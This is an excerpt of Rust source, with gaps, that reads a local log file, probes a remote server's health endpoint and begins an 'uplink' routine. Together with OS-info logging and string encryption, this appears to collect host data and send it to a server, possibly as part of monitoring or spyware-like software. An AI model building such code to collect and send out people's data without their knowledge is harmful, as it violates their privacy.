...
mod log;
use log::logger::{log, log_os_info};

mod crypt;
use crypt::cryption::encrypt_string;
...
fn logger_file_exists() -> bool {
    metadata(LOGGER).is_ok()
}

async fn can_establish_connection() -> bool {
    
    let client = Client::new();

    match client.get(format!("{BASE_URL}/health")).timeout(Duration::from_secs(5)).send().await {
...
async fn uplink() -> Result<(), Error> {
    
    if !logger_file_exists() {
        return Ok(());
    }

    let logs = read_to_string(LOGGER).expect("");
